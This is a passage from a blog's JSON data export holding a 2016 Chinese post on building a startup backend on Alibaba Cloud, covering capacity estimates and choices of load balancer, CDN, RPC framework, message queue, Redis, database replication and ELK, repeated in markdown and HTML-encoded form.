href=\"http://blog.csdn.net/zk673820543/article/details/50617412\">http://blog.csdn.net/zk673820543/article/details/50617412</a></p>\n<p><strong>grafana-zabbix&#x4F7F;&#x7528;&#x6559;&#x7A0B;&#x3010;&#x5185;&#x542B;gif&#x56FE;&#x3011;&#xFF1A;</strong><br><a href=\"https://github.com/alexanderzobnin/grafana-zabbix/wiki/Usage\">https://github.com/alexanderzobnin/grafana-zabbix/wiki/Usage</a></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E5%AE%89%E8%A3%85/2.gif\" alt=\"\"></p>"},{"title":"创业互联网公司如何搭建自己的技术框架","date":"2016-09-06T10:24:17.000Z","toc":false,"_content":"\n### 适用范围\n本文主要针对小型互联网公司，特别适用于手机APP的后台架构，基本可以支撑5万日活\n本文会对可能用到的相关技术进行技术选型的说明，以及相对应的设备的采购。\n\n### 技术指标\n说一下一些技术指标的计算过程可以作为其他同学的参考\n- QPS， 如果是5万日活，使用集中在每天的4小时，每个用户大概产生100的请求，那么平均下来，我们系统大概应该支撑的请求为：50000 * 100 / (4 * 60 * 60) = 350 qps/s\n- 业务数据 业务量，我们自己是新闻业务，可能会有其他的业务，比如游戏，商城等等，基本每天新增的业务数据都会在同一个量级， 每日10000， 另外跟用户相关的信息也是比较大的一块，比如用户的订阅等行为，一共5万的用户，保存相关信息可能大概需要100条的数据。\n- 缓存大小 主要业务数据和用户相关的热点数据限时保存在缓存中， 大概需要5个G左右。\n- 日志大小 用户日志和请求日志。 大概每天3个G左右\n\n## 技术架构\n![](https://yqfile.alicdn.com/a8c7785310dd2249d71a68d05910ca203a9b5ff1.png)\n\n<!-- more -->\n\n整体架构因为是小公司，我们基于阿里云来搭建，对图中的内容和技术选型进行一下说明：\n\n#### 负载均衡\n 可选方案： SLB, Nginx.\n - SLB要收钱，但是比较便宜，有保证，不会挂。 但是可配置的很少，不能根据域名做ip映射\n - Nginx, 没啥缺点，需要一定的知识。\n建议： SLB + Nginx, SLB绑定域名作为统一的入口，然后每个服务器上再搭建Nginx.\n\n#### CDN\n用于缓存静态文件等等。 七牛和阿里的都还可以。\n- 七牛要做的久一点， 各种图片处理的接口要完善一些\n- 阿里的CDN要稍微好一点点， 但是没有不安全的访问方式，访问稍微没有那么灵活。 图片处理功能弱一点。\n\n#### 分布式调用框架\n目前可选的有ZK + dubbo. ZK + Motan, ZK + dubbox, edas。\n- dubbo, 阿里的服务治理框架，已经不维护了，切换反应有点慢\n- dubboX, 当当基于dubbo搞的，还在维护可以一用，推荐。\n- Motan, 微博的服务治理矿建， 刚开源，需要学习一下， 推荐。\n- Edas, 阿里云服务，要收钱，侵入型很强，不推荐\n\n#### MQ\n可选的有： ActiveMQ, 阿里云消息， robbitMQ, \n各有好处， 但是考虑到运维的难度，推荐阿里云消息。\n\n#### Redis\n用来做缓存， 自建成本有点高，需要Codis, 分片，集群，主从等等，很麻烦。 建议直接用阿里的\n\n#### 数据库\n主要基于读写分离和主从复制考虑，目前可以自建和选用阿里的DRDS。\n- DRDS 要花钱，成本较高，没有必要\n- 自建，  不用中间件，直接1写2只读， 然后配置读写分离的数据源，内网SLB进行读集群。解决之。\n\n#### 搜索\n建议ELK， 可以自动同步数据库，除了搜索引擎的功能外，还可以做日志搜索，监控系统。\n\n#### 一些典型的业务场景说明\n把业务底层做成SOA模块，通过分布式调用框架对外提供服务。\n单独做一个小的系统来运行定时任务\n热点数据放缓存，然后通过MQ来更新缓存\n日志等数据有必要可以考虑上个Mongo\n\n</br>","source":"_posts/创业互联网公司如何搭建自己的技术框架.md","raw":"---\ntitle: 创业互联网公司如何搭建自己的技术框架\ncategories:\n  - 我的收藏\ndate: 2016-9-6 18:24:17\ntoc: false\n---\n\n### 适用范围\n本文主要针对小型互联网公司，特别适用于手机APP的后台架构，基本可以支撑5万日活\n本文会对可能用到的相关技术进行技术选型的说明，以及相对应的设备的采购。\n\n### 技术指标\n说一下一些技术指标的计算过程可以作为其他同学的参考\n- QPS， 如果是5万日活，使用集中在每天的4小时，每个用户大概产生100的请求，那么平均下来，我们系统大概应该支撑的请求为：50000 * 100 / (4 * 60 * 60) = 350 qps/s\n- 业务数据 业务量，我们自己是新闻业务，可能会有其他的业务，比如游戏，商城等等，基本每天新增的业务数据都会在同一个量级， 每日10000， 另外跟用户相关的信息也是比较大的一块，比如用户的订阅等行为，一共5万的用户，保存相关信息可能大概需要100条的数据。\n- 缓存大小 主要业务数据和用户相关的热点数据限时保存在缓存中， 大概需要5个G左右。\n- 日志大小 用户日志和请求日志。 大概每天3个G左右\n\n## 技术架构\n![](https://yqfile.alicdn.com/a8c7785310dd2249d71a68d05910ca203a9b5ff1.png)\n\n<!-- more -->\n\n整体架构因为是小公司，我们基于阿里云来搭建，对图中的内容和技术选型进行一下说明：\n\n#### 负载均衡\n 可选方案： SLB, Nginx.\n - SLB要收钱，但是比较便宜，有保证，不会挂。 但是可配置的很少，不能根据域名做ip映射\n - Nginx, 没啥缺点，需要一定的知识。\n建议： SLB + Nginx, SLB绑定域名作为统一的入口，然后每个服务器上再搭建Nginx.\n\n#### CDN\n用于缓存静态文件等等。 七牛和阿里的都还可以。\n- 七牛要做的久一点， 各种图片处理的接口要完善一些\n- 阿里的CDN要稍微好一点点， 但是没有不安全的访问方式，访问稍微没有那么灵活。 图片处理功能弱一点。\n\n#### 分布式调用框架\n目前可选的有ZK + dubbo. ZK + Motan, ZK + dubbox, edas。\n- dubbo, 阿里的服务治理框架，已经不维护了，切换反应有点慢\n- dubboX, 当当基于dubbo搞的，还在维护可以一用，推荐。\n- Motan, 微博的服务治理矿建， 刚开源，需要学习一下， 推荐。\n- Edas, 阿里云服务，要收钱，侵入型很强，不推荐\n\n#### MQ\n可选的有： ActiveMQ, 阿里云消息， robbitMQ, \n各有好处， 但是考虑到运维的难度，推荐阿里云消息。\n\n#### Redis\n用来做缓存， 自建成本有点高，需要Codis, 分片，集群，主从等等，很麻烦。 建议直接用阿里的\n\n#### 数据库\n主要基于读写分离和主从复制考虑，目前可以自建和选用阿里的DRDS。\n- DRDS 要花钱，成本较高，没有必要\n- 自建，  不用中间件，直接1写2只读， 然后配置读写分离的数据源，内网SLB进行读集群。解决之。\n\n#### 搜索\n建议ELK， 可以自动同步数据库，除了搜索引擎的功能外，还可以做日志搜索，监控系统。\n\n#### 一些典型的业务场景说明\n把业务底层做成SOA模块，通过分布式调用框架对外提供服务。\n单独做一个小的系统来运行定时任务\n热点数据放缓存，然后通过MQ来更新缓存\n日志等数据有必要可以考虑上个Mongo\n\n</br>","slug":"创业互联网公司如何搭建自己的技术框架","published":1,"updated":"2016-11-17T11:59:42.679Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrule9004dgwtmmcz3td7m","content":"<h3 id=\"&#x9002;&#x7528;&#x8303;&#x56F4;\"><a href=\"#&#x9002;&#x7528;&#x8303;&#x56F4;\" class=\"headerlink\" title=\"&#x9002;&#x7528;&#x8303;&#x56F4;\"></a>&#x9002;&#x7528;&#x8303;&#x56F4;</h3><p>&#x672C;&#x6587;&#x4E3B;&#x8981;&#x9488;&#x5BF9;&#x5C0F;&#x578B;&#x4E92;&#x8054;&#x7F51;&#x516C;&#x53F8;&#xFF0C;&#x7279;&#x522B;&#x9002;&#x7528;&#x4E8E;&#x624B;&#x673A;APP&#x7684;&#x540E;&#x53F0;&#x67B6;&#x6784;&#xFF0C;&#x57FA;&#x672C;&#x53EF;&#x4EE5;&#x652F;&#x6491;5&#x4E07;&#x65E5;&#x6D3B;<br>&#x672C;&#x6587;&#x4F1A;&#x5BF9;&#x53EF;&#x80FD;&#x7528;&#x5230;&#x7684;&#x76F8;&#x5173;&#x6280;&#x672F;&#x8FDB;&#x884C;&#x6280;&#x672F;&#x9009;&#x578B;&#x7684;&#x8BF4;&#x660E;&#xFF0C;&#x4EE5;&#x53CA;&#x76F8;&#x5BF9;&#x5E94;&#x7684;&#x8BBE;&#x5907;&#x7684;&#x91C7;&#x8D2D;&#x3002;</p>\n<h3 id=\"&#x6280;&#x672F;&#x6307;&#x6807;\"><a href=\"#&#x6280;&#x672F;&#x6307;&#x6807;\" class=\"headerlink\" title=\"&#x6280;&#x672F;&#x6307;&#x6807;\"></a>&#x6280;&#x672F;&#x6307;&#x6807;</h3><p>&#x8BF4;&#x4E00;&#x4E0B;&#x4E00;&#x4E9B;&#x6280;&#x672F;&#x6307;&#x6807;&#x7684;&#x8BA1;&#x7B97;&#x8FC7;&#x7A0B;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x5176;&#x4ED6;&#x540C;&#x5B66;&#x7684;&#x53C2;&#x8003;</p>\n<ul>\n<li>QPS&#xFF0C; &#x5982;&#x679C;&#x662F;5&#x4E07;&#x65E5;&#x6D3B;&#xFF0C;&#x4F7F;&#x7528;&#x96C6;&#x4E2D;&#x5728;&#x6BCF;&#x5929;&#x7684;4&#x5C0F;&#x65F6;&#xFF0C;&#x6BCF;&#x4E2A;&#x7528;&#x6237;&#x5927;&#x6982;&#x4EA7;&#x751F;100&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x90A3;&#x4E48;&#x5E73;&#x5747;&#x4E0B;&#x6765;&#xFF0C;&#x6211;&#x4EEC;&#x7CFB;&#x7EDF;&#x5927;&#x6982;&#x5E94;&#x8BE5;&#x652F;&#x6491;&#x7684;&#x8BF7;&#x6C42;&#x4E3A;&#xFF1A;50000 <em> 100 / (4 </em> 60 * 60) = 350 qps/s</li>\n<li>&#x4E1A;&#x52A1;&#x6570;&#x636E; &#x4E1A;&#x52A1;&#x91CF;&#xFF0C;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x662F;&#x65B0;&#x95FB;&#x4E1A;&#x52A1;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x6709;&#x5176;&#x4ED6;&#x7684;&#x4E1A;&#x52A1;&#xFF0C;&#x6BD4;&#x5982;&#x6E38;&#x620F;&#xFF0C;&#x5546;&#x57CE;&#x7B49;&#x7B49;&#xFF0C;&#x57FA;&#x672C;&#x6BCF;&#x5929;&#x65B0;&#x589E;&#x7684;&#x4E1A;&#x52A1;&#x6570;&#x636E;&#x90FD;&#x4F1A;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x91CF;&#x7EA7;&#xFF0C; &#x6BCF;&#x65E5;10000&#xFF0C; &#x53E6;&#x5916;&#x8DDF;&#x7528;&#x6237;&#x76F8;&#x5173;&#x7684;&#x4FE1;&#x606F;&#x4E5F;&#x662F;&#x6BD4;&#x8F83;&#x5927;&#x7684;&#x4E00;&#x5757;&#xFF0C;&#x6BD4;&#x5982;&#x7528;&#x6237;&#x7684;&#x8BA2;&#x9605;&#x7B49;&#x884C;&#x4E3A;&#xFF0C;&#x4E00;&#x5171;5&#x4E07;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x4FDD;&#x5B58;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x53EF;&#x80FD;&#x5927;&#x6982;&#x9700;&#x8981;100&#x6761;&#x7684;&#x6570;&#x636E;&#x3002;</li>\n<li>&#x7F13;&#x5B58;&#x5927;&#x5C0F; &#x4E3B;&#x8981;&#x4E1A;&#x52A1;&#x6570;&#x636E;&#x548C;&#x7528;&#x6237;&#x76F8;&#x5173;&#x7684;&#x70ED;&#x70B9;&#x6570;&#x636E;&#x9650;&#x65F6;&#x4FDD;&#x5B58;&#x5728;&#x7F13;&#x5B58;&#x4E2D;&#xFF0C; &#x5927;&#x6982;&#x9700;&#x8981;5&#x4E2A;G&#x5DE6;&#x53F3;&#x3002;</li>\n<li>&#x65E5;&#x5FD7;&#x5927;&#x5C0F; &#x7528;&#x6237;&#x65E5;&#x5FD7;&#x548C;&#x8BF7;&#x6C42;&#x65E5;&#x5FD7;&#x3002; &#x5927;&#x6982;&#x6BCF;&#x5929;3&#x4E2A;G&#x5DE6;&#x53F3;</li>\n</ul>\n<h2 id=\"&#x6280;&#x672F;&#x67B6;&#x6784;\"><a href=\"#&#x6280;&#x672F;&#x67B6;&#x6784;\" class=\"headerlink\" title=\"&#x6280;&#x672F;&#x67B6;&#x6784;\"></a>&#x6280;&#x672F;&#x67B6;&#x6784;</h2><p><img src=\"https://yqfile.alicdn.com/a8c7785310dd2249d71a68d05910ca203a9b5ff1.png\" alt=\"\"></p>\n<a id=\"more\"></a>\n<p>&#x6574;&#x4F53;&#x67B6;&#x6784;&#x56E0;&#x4E3A;&#x662F;&#x5C0F;&#x516C;&#x53F8;&#xFF0C;&#x6211;&#x4EEC;&#x57FA;&#x4E8E;&#x963F;&#x91CC;&#x4E91;&#x6765;&#x642D;&#x5EFA;&#xFF0C;&#x5BF9;&#x56FE;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x548C;&#x6280;&#x672F;&#x9009;&#x578B;&#x8FDB;&#x884C;&#x4E00;&#x4E0B;&#x8BF4;&#x660E;&#xFF1A;</p>\n<h4 id=\"&#x8D1F;&#x8F7D;&#x5747;&#x8861;\"><a href=\"#&#x8D1F;&#x8F7D;&#x5747;&#x8861;\" class=\"headerlink\" title=\"&#x8D1F;&#x8F7D;&#x5747;&#x8861;\"></a>&#x8D1F;&#x8F7D;&#x5747;&#x8861;</h4><p> &#x53EF;&#x9009;&#x65B9;&#x6848;&#xFF1A; SLB, Nginx.</p>\n<ul>\n<li>SLB&#x8981;&#x6536;&#x94B1;&#xFF0C;&#x4F46;&#x662F;&#x6BD4;&#x8F83;&#x4FBF;&#x5B9C;&#xFF0C;&#x6709;&#x4FDD;&#x8BC1;&#xFF0C;&#x4E0D;&#x4F1A;&#x6302;&#x3002; &#x4F46;&#x662F;&#x53EF;&#x914D;&#x7F6E;&#x7684;&#x5F88;&#x5C11;&#xFF0C;&#x4E0D;&#x80FD;&#x6839;&#x636E;&#x57DF;&#x540D;&#x505A;ip&#x6620;&#x5C04;</li>\n<li>Nginx, &#x6CA1;&#x5565;&#x7F3A;&#x70B9;&#xFF0C;&#x9700;&#x8981;&#x4E00;&#x5B9A;&#x7684;&#x77E5;&#x8BC6;&#x3002;<br>&#x5EFA;&#x8BAE;&#xFF1A; SLB + Nginx, SLB&#x7ED1;&#x5B9A;&#x57DF;&#x540D;&#x4F5C;&#x4E3A;&#x7EDF;&#x4E00;&#x7684;&#x5165;&#x53E3;&#xFF0C;&#x7136;&#x540E;&#x6BCF;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x518D;&#x642D;&#x5EFA;Nginx.</li>\n</ul>\n<h4 id=\"CDN\"><a href=\"#CDN\" class=\"headerlink\" title=\"CDN\"></a>CDN</h4><p>&#x7528;&#x4E8E;&#x7F13;&#x5B58;&#x9759;&#x6001;&#x6587;&#x4EF6;&#x7B49;&#x7B49;&#x3002; &#x4E03;&#x725B;&#x548C;&#x963F;&#x91CC;&#x7684;&#x90FD;&#x8FD8;&#x53EF;&#x4EE5;&#x3002;</p>\n<ul>\n<li>&#x4E03;&#x725B;&#x8981;&#x505A;&#x7684;&#x4E45;&#x4E00;&#x70B9;&#xFF0C; &#x5404;&#x79CD;&#x56FE;&#x7247;&#x5904;&#x7406;&#x7684;&#x63A5;&#x53E3;&#x8981;&#x5B8C;&#x5584;&#x4E00;&#x4E9B;</li>\n<li>&#x963F;&#x91CC;&#x7684;CDN&#x8981;&#x7A0D;&#x5FAE;&#x597D;&#x4E00;&#x70B9;&#x70B9;&#xFF0C; &#x4F46;&#x662F;&#x6CA1;&#x6709;&#x4E0D;&#x5B89;&#x5168;&#x7684;&#x8BBF;&#x95EE;&#x65B9;&#x5F0F;&#xFF0C;&#x8BBF;&#x95EE;&#x7A0D;&#x5FAE;&#x6CA1;&#x6709;&#x90A3;&#x4E48;&#x7075;&#x6D3B;&#x3002; &#x56FE;&#x7247;&#x5904;&#x7406;&#x529F;&#x80FD;&#x5F31;&#x4E00;&#x70B9;&#x3002;</li>\n</ul>\n<h4 id=\"&#x5206;&#x5E03;&#x5F0F;&#x8C03;&#x7528;&#x6846;&#x67B6;\"><a href=\"#&#x5206;&#x5E03;&#x5F0F;&#x8C03;&#x7528;&#x6846;&#x67B6;\" class=\"headerlink\" title=\"&#x5206;&#x5E03;&#x5F0F;&#x8C03;&#x7528;&#x6846;&#x67B6;\"></a>&#x5206;&#x5E03;&#x5F0F;&#x8C03;&#x7528;&#x6846;&#x67B6;</h4><p>&#x76EE;&#x524D;&#x53EF;&#x9009;&#x7684;&#x6709;ZK + dubbo. ZK + Motan, ZK + dubbox, edas&#x3002;</p>\n<ul>\n<li>dubbo, &#x963F;&#x91CC;&#x7684;&#x670D;&#x52A1;&#x6CBB;&#x7406;&#x6846;&#x67B6;&#xFF0C;&#x5DF2;&#x7ECF;&#x4E0D;&#x7EF4;&#x62A4;&#x4E86;&#xFF0C;&#x5207;&#x6362;&#x53CD;&#x5E94;&#x6709;&#x70B9;&#x6162;</li>\n<li>dubboX, &#x5F53;&#x5F53;&#x57FA;&#x4E8E;dubbo&#x641E;&#x7684;&#xFF0C;&#x8FD8;&#x5728;&#x7EF4;&#x62A4;&#x53EF;&#x4EE5;&#x4E00;&#x7528;&#xFF0C;&#x63A8;&#x8350;&#x3002;</li>\n<li>Motan, &#x5FAE;&#x535A;&#x7684;&#x670D;&#x52A1;&#x6CBB;&#x7406;&#x77FF;&#x5EFA;&#xFF0C; &#x521A;&#x5F00;&#x6E90;&#xFF0C;&#x9700;&#x8981;&#x5B66;&#x4E60;&#x4E00;&#x4E0B;&#xFF0C; &#x63A8;&#x8350;&#x3002;</li>\n<li>Edas, &#x963F;&#x91CC;&#x4E91;&#x670D;&#x52A1;&#xFF0C;&#x8981;&#x6536;&#x94B1;&#xFF0C;&#x4FB5;&#x5165;&#x578B;&#x5F88;&#x5F3A;&#xFF0C;&#x4E0D;&#x63A8;&#x8350;</li>\n</ul>\n<h4 id=\"MQ\"><a href=\"#MQ\" class=\"headerlink\" title=\"MQ\"></a>MQ</h4><p>&#x53EF;&#x9009;&#x7684;&#x6709;&#xFF1A; ActiveMQ, &#x963F;&#x91CC;&#x4E91;&#x6D88;&#x606F;&#xFF0C; robbitMQ,<br>&#x5404;&#x6709;&#x597D;&#x5904;&#xFF0C; &#x4F46;&#x662F;&#x8003;&#x8651;&#x5230;&#x8FD0;&#x7EF4;&#x7684;&#x96BE;&#x5EA6;&#xFF0C;&#x63A8;&#x8350;&#x963F;&#x91CC;&#x4E91;&#x6D88;&#x606F;&#x3002;</p>\n<h4 id=\"Redis\"><a href=\"#Redis\" class=\"headerlink\" title=\"Redis\"></a>Redis</h4><p>&#x7528;&#x6765;&#x505A;&#x7F13;&#x5B58;&#xFF0C; &#x81EA;&#x5EFA;&#x6210;&#x672C;&#x6709;&#x70B9;&#x9AD8;&#xFF0C;&#x9700;&#x8981;Codis, &#x5206;&#x7247;&#xFF0C;&#x96C6;&#x7FA4;&#xFF0C;&#x4E3B;&#x4ECE;&#x7B49;&#x7B49;&#xFF0C;&#x5F88;&#x9EBB;&#x70E6;&#x3002; &#x5EFA;&#x8BAE;&#x76F4;&#x63A5;&#x7528;&#x963F;&#x91CC;&#x7684;</p>\n<h4 id=\"&#x6570;&#x636E;&#x5E93;\"><a href=\"#&#x6570;&#x636E;&#x5E93;\" class=\"headerlink\" title=\"&#x6570;&#x636E;&#x5E93;\"></a>&#x6570;&#x636E;&#x5E93;</h4><p>&#x4E3B;&#x8981;&#x57FA;&#x4E8E;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x548C;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8003;&#x8651;&#xFF0C;&#x76EE;&#x524D;&#x53EF;&#x4EE5;&#x81EA;&#x5EFA;&#x548C;&#x9009;&#x7528;&#x963F;&#x91CC;&#x7684;DRDS&#x3002;</p>\n<ul>\n<li>DRDS &#x8981;&#x82B1;&#x94B1;&#xFF0C;&#x6210;&#x672C;&#x8F83;&#x9AD8;&#xFF0C;&#x6CA1;&#x6709;&#x5FC5;&#x8981;</li>\n<li>&#x81EA;&#x5EFA;&#xFF0C;  &#x4E0D;&#x7528;&#x4E2D;&#x95F4;&#x4EF6;&#xFF0C;&#x76F4;&#x63A5;1&#x5199;2&#x53EA;&#x8BFB;&#xFF0C; &#x7136;&#x540E;&#x914D;&#x7F6E;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x7684;&#x6570;&#x636E;&#x6E90;&#xFF0C;&#x5185;&#x7F51;SLB&#x8FDB;&#x884C;&#x8BFB;&#x96C6;&#x7FA4;&#x3002;&#x89E3;&#x51B3;&#x4E4B;&#x3002;</li>\n</ul>\n<h4 id=\"&#x641C;&#x7D22;\"><a href=\"#&#x641C;&#x7D22;\" class=\"headerlink\" title=\"&#x641C;&#x7D22;\"></a>&#x641C;&#x7D22;</h4><p>&#x5EFA;&#x8BAE;ELK&#xFF0C; &#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x540C;&#x6B65;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x9664;&#x4E86;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x7684;&#x529F;&#x80FD;&#x5916;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x505A;&#x65E5;&#x5FD7;&#x641C;&#x7D22;&#xFF0C;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x3002;</p>\n<h4 id=\"&#x4E00;&#x4E9B;&#x5178;&#x578B;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x8BF4;&#x660E;\"><a href=\"#&#x4E00;&#x4E9B;&#x5178;&#x578B;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x8BF4;&#x660E;\" class=\"headerlink\" title=\"&#x4E00;&#x4E9B;&#x5178;&#x578B;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x8BF4;&#x660E;\"></a>&#x4E00;&#x4E9B;&#x5178;&#x578B;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x8BF4;&#x660E;</h4><p>&#x628A;&#x4E1A;&#x52A1;&#x5E95;&#x5C42;&#x505A;&#x6210;SOA&#x6A21;&#x5757;&#xFF0C;&#x901A;&#x8FC7;&#x5206;&#x5E03;&#x5F0F;&#x8C03;&#x7528;&#x6846;&#x67B6;&#x5BF9;&#x5916;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#x3002;<br>&#x5355;&#x72EC;&#x505A;&#x4E00;&#x4E2A;&#x5C0F;&#x7684;&#x7CFB;&#x7EDF;&#x6765;&#x8FD0;&#x884C;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;<br>&#x70ED;&#x70B9;&#x6570;&#x636E;&#x653E;&#x7F13;&#x5B58;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;MQ&#x6765;&#x66F4;&#x65B0;&#x7F13;&#x5B58;<br>&#x65E5;&#x5FD7;&#x7B49;&#x6570;&#x636E;&#x6709;&#x5FC5;&#x8981;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x4E0A;&#x4E2A;Mongo</p>\n<p><br></p>\n","excerpt":"<h3 id=\"&#x9002;&#x7528;&#x8303;&#x56F4;\"><a href=\"#&#x9002;&#x7528;&#x8303;&#x56F4;\" class=\"headerlink\" title=\"&#x9002;&#x7528;&#x8303;&#x56F4;\"></a>&#x9002;&#x7528;&#x8303;&#x56F4;</h3><p>&#x672C;&#x6587;&#x4E3B;&#x8981;&#x9488;&#x5BF9;&#x5C0F;&#x578B;&#x4E92;&#x8054;&#x7F51;&#x516C;&#x53F8;&#xFF0C;&#x7279;&#x522B;&#x9002;&#x7528;&#x4E8E;&#x624B;&#x673A;APP&#x7684;&#x540E;&#x53F0;&#x67B6;&#x6784;&#xFF0C;&#x57FA;&#x672C;&#x53EF;&#x4EE5;&#x652F;&#x6491;5&#x4E07;&#x65E5;&#x6D3B;<br>&#x672C;&#x6587;&#x4F1A;&#x5BF9;&#x53EF;&#x80FD;&#x7528;&#x5230;&#x7684;&#x76F8;&#x5173;&#x6280;&#x672F;&#x8FDB;&#x884C;&#x6280;&#x672F;&#x9009;&#x578B;&#x7684;&#x8BF4;&#x660E;&#xFF0C;&#x4EE5;&#x53CA;&#x76F8;&#x5BF9;&#x5E94;&#x7684;&#x8BBE;&#x5907;&#x7684;&#x91C7;&#x8D2D;&#x3002;</p>\n<h3 id=\"&#x6280;&#x672F;&#x6307;&#x6807;\"><a href=\"#&#x6280;&#x672F;&#x6307;&#x6807;\" class=\"headerlink\" title=\"&#x6280;&#x672F;&#x6307;&#x6807;\"></a>&#x6280;&#x672F;&#x6307;&#x6807;</h3><p>&#x8BF4;&#x4E00;&#x4E0B;&#x4E00;&#x4E9B;&#x6280;&#x672F;&#x6307;&#x6807;&#x7684;&#x8BA1;&#x7B97;&#x8FC7;&#x7A0B;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x5176;&#x4ED6;&#x540C;&#x5B66;&#x7684;&#x53C2;&#x8003;</p>\n<ul>\n<li>QPS&#xFF0C; &#x5982;&#x679C;&#x662F;5&#x4E07;&#x65E5;&#x6D3B;&#xFF0C;&#x4F7F;&#x7528;&#x96C6;&#x4E2D;&#x5728;&#x6BCF;&#x5929;&#x7684;4&#x5C0F;&#x65F6;&#xFF0C;&#x6BCF;&#x4E2A;&#x7528;&#x6237;&#x5927;&#x6982;&#x4EA7;&#x751F;100&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x90A3;&#x4E48;&#x5E73;&#x5747;&#x4E0B;&#x6765;&#xFF0C;&#x6211;&#x4EEC;&#x7CFB;&#x7EDF;&#x5927;&#x6982;&#x5E94;&#x8BE5;&#x652F;&#x6491;&#x7684;&#x8BF7;&#x6C42;&#x4E3A;&#xFF1A;50000 <em> 100 / (4 </em> 60 * 60) = 350 qps/s</li>\n<li>&#x4E1A;&#x52A1;&#x6570;&#x636E; &#x4E1A;&#x52A1;&#x91CF;&#xFF0C;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x662F;&#x65B0;&#x95FB;&#x4E1A;&#x52A1;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x6709;&#x5176;&#x4ED6;&#x7684;&#x4E1A;&#x52A1;&#xFF0C;&#x6BD4;&#x5982;&#x6E38;&#x620F;&#xFF0C;&#x5546;&#x57CE;&#x7B49;&#x7B49;&#xFF0C;&#x57FA;&#x672C;&#x6BCF;&#x5929;&#x65B0;&#x589E;&#x7684;&#x4E1A;&#x52A1;&#x6570;&#x636E;&#x90FD;&#x4F1A;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x91CF;&#x7EA7;&#xFF0C; &#x6BCF;&#x65E5;10000&#xFF0C; &#x53E6;&#x5916;&#x8DDF;&#x7528;&#x6237;&#x76F8;&#x5173;&#x7684;&#x4FE1;&#x606F;&#x4E5F;&#x662F;&#x6BD4;&#x8F83;&#x5927;&#x7684;&#x4E00;&#x5757;&#xFF0C;&#x6BD4;&#x5982;&#x7528;&#x6237;&#x7684;&#x8BA2;&#x9605;&#x7B49;&#x884C;&#x4E3A;&#xFF0C;&#x4E00;&#x5171;5&#x4E07;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x4FDD;&#x5B58;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x53EF;&#x80FD;&#x5927;&#x6982;&#x9700;&#x8981;100&#x6761;&#x7684;&#x6570;&#x636E;&#x3002;</li>\n<li>&#x7F13;&#x5B58;&#x5927;&#x5C0F; &#x4E3B;&#x8981;&#x4E1A;&#x52A1;&#x6570;&#x636E;&#x548C;&#x7528;&#x6237;&#x76F8;&#x5173;&#x7684;&#x70ED;&#x70B9;&#x6570;&#x636E;&#x9650;&#x65F6;&#x4FDD;&#x5B58;&#x5728;&#x7F13;&#x5B58;&#x4E2D;&#xFF0C; &#x5927;&#x6982;&#x9700;&#x8981;5&#x4E2A;G&#x5DE6;&#x53F3;&#x3002;</li>\n<li>&#x65E5;&#x5FD7;&#x5927;&#x5C0F; &#x7528;&#x6237;&#x65E5;&#x5FD7;&#x548C;&#x8BF7;&#x6C42;&#x65E5;&#x5FD7;&#x3002; &#x5927;&#x6982;&#x6BCF;&#x5929;3&#x4E2A;G&#x5DE6;&#x53F3;</li>\n</ul>\n<h2 id=\"&#x6280;&#x672F;&#x67B6;&#x6784;\"><a href=\"#&#x6280;&#x672F;&#x67B6;&#x6784;\" class=\"headerlink\" title=\"&#x6280;&#x672F;&#x67B6;&#x6784;\"></a>&#x6280;&#x672F;&#x67B6;&#x6784;</h2><p><img src=\"https://yqfile.alicdn.com/a8c7785310dd2249d71a68d05910ca203a9b5ff1.png\" alt=\"\"></p>","more":"<p>&#x6574;&#x4F53;&#x67B6;&#x6784;&#x56E0;&#x4E3A;&#x662F;&#x5C0F;&#x516C;&#x53F8;&#xFF0C;&#x6211;&#x4EEC;&#x57FA;&#x4E8E;&#x963F;&#x91CC;&#x4E91;&#x6765;&#x642D;&#x5EFA;&#xFF0C;&#x5BF9;&#x56FE;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x548C;&#x6280;&#x672F;&#x9009;&#x578B;&#x8FDB;&#x884C;&#x4E00;&#x4E0B;&#x8BF4;&#x660E;&#xFF1A;</p>\n<h4 id=\"&#x8D1F;&#x8F7D;&#x5747;&#x8861;\"><a href=\"#&#x8D1F;&#x8F7D;&#x5747;&#x8861;\" class=\"headerlink\" title=\"&#x8D1F;&#x8F7D;&#x5747;&#x8861;\"></a>&#x8D1F;&#x8F7D;&#x5747;&#x8861;</h4><p> &#x53EF;&#x9009;&#x65B9;&#x6848;&#xFF1A; SLB, 